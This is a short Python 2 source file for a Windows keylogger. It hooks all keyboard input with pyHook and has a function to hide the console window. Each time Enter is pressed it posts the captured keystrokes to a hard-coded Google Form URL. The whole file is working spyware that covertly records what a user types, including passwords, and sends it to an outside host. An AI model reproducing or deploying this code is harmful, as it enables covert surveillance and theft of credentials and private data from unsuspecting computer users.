try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
import os
import sys
import threading
import urllib,urllib2
import datetime,time
import win32event, win32api, winerror


data=""
#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True
def msg():
    print """GG"""
    return True


#Remote Google Form logs post
def remote():
    global data
    url="https://docs.google.com/forms/d/1IqfjoKPtdUfISndUuqhXgbLojcv8yBp42bvrxPdAdHM/formResponse" #Specify Google Form URL here
    klog={'entry.1861467089':data} #Specify the Field Name here
    try:
        dataenc=urllib.urlencode(klog)
        req=urllib2.Request(url,dataenc)
        response=urllib2.urlopen(req)
        data=''
    except Exception as e:
        print e
    return True


def keypressed(event):
    global data
    if event.Ascii==13:
        keys='<ENTER>'
        remote()
        print data
    elif event.Ascii==8:
        keys='<BACK>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys 

def wait_for_internet_connection():
    while True:
        try:
            response = urllib2.urlopen('http://www.google.com',timeout=3)
            return
        except urllib2.URLError:
            pass

wait_for_internet_connection()
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
